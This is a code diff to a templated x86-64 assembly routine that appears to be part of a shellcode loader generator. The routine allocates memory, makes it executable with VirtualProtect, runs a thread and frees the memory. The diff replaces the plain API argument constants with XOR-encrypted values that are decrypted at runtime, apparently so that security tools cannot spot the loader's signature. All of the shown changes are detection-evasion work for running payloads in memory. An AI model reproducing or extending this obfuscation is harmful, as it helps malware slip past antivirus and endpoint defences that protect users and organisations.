@@ -270,8 +270,12 @@ entry:
   mov rax, [rsp+0x10]                          {{igi}} // address of VirtualAlloc
   xor rcx, rcx                                 {{igi}} // lpAddress
   mov rdx, {{hex .MemRegionSize}}              {{igi}} // dwSize
-  mov r8, 0x3000                               {{igi}} // flAllocationType MEM_RESERVE|MEM_COMMIT
-  mov r9, 0x04                                 {{igi}} // flProtect PAGE_READWRITE
+  mov r8, {{hex .PAData.AllocationType}}       {{igi}} // flAllocationType MEM_RESERVE|MEM_COMMIT
+  mov r10, {{hex .PAKey.AllocationType}}       {{igi}} // set decrypt key
+  xor r8, r10                                  {{igi}} // decrypt argument
+  mov r9, {{hex .PAData.Protect}}              {{igi}} // flProtect PAGE_READWRITE
+  mov r11, {{hex .PAKey.Protect}}              {{igi}} // set decrypt key
+  xor r9, r11                                  {{igi}} // decrypt argument
   sub rsp, 0x20                                {{igi}} // reserve stack for call convention
   call rax                                     {{igi}} // call VirtualAlloc
   add rsp, 0x20                                {{igi}} // restore stack for call convention
@@ -307,7 +311,9 @@ entry:
   mov rcx, [rsp+0x08]                          {{igi}} // lpAddress
   sub rsp, 0x10                                {{igi}} // for store old protect
   mov rdx, {{hex .MemRegionSize}}              {{igi}} // dwSize
-  mov r8, 0x40                                 {{igi}} // flNewProtect PAGE_EXECUTE_READWRITE
+  mov r8, {{hex .PAData.NewProtect}}           {{igi}} // flNewProtect PAGE_EXECUTE_READWRITE
+  mov r10, {{hex .PAKey.NewProtect}}           {{igi}} // set decrypt key
+  xor r8, r10                                  {{igi}} // decrypt argument
   mov r9, rsp                                  {{igi}} // lpflOldProtect
   sub rsp, 0x20                                {{igi}} // reserve stack for call convention
   call rax                                     {{igi}} // call VirtualProtect
@@ -395,7 +401,9 @@ entry:
 
   {{if .NeedWaitThread}}
     mov rcx, rax                               {{igi}} // hHandle, hThread
-    mov rdx, 0xFFFFFFFF                        {{igi}} // dwMilliseconds, INFINITE
+    mov rdx, {{hex .PAData.Infinite}}          {{igi}} // dwMilliseconds, INFINITE
+    mov r8, {{hex .PAKey.Infinite}}            {{igi}} // set decrypt key
+    xor rdx, r8                                {{igi}} // decrypt argument
     mov rax, [rsp+0x30]                        {{igi}} // address of WaitForSingleObject
     sub rsp, 0x20                              {{igi}} // reserve stack for call convention
     call rax                                   {{igi}} // call WaitForSingleObject
@@ -441,7 +449,9 @@ entry:
   mov rax, [rsp+0x18]                          {{igi}} // address of VirtualFree
   mov rcx, [rsp+0x08]                          {{igi}} // address of allocated memory
   xor rdx, rdx                                 {{igi}} // dwSize
-  mov r8, 0x8000                               {{igi}} // dwFreeType MEM_RELEASE
+  mov r8, {{hex .PAData.FreeType}}             {{igi}} // dwFreeType MEM_RELEASE
+  mov r9, {{hex .PAKey.FreeType}}              {{igi}} // set decrypt key
+  xor r8, r9                                   {{igi}} // decrypt argument
   sub rsp, 0x20                                {{igi}} // reserve stack for call convention
   call rax                                     {{igi}} // call VirtualFree
   add rsp, 0x20                                {{igi}} // restore stack for call convention
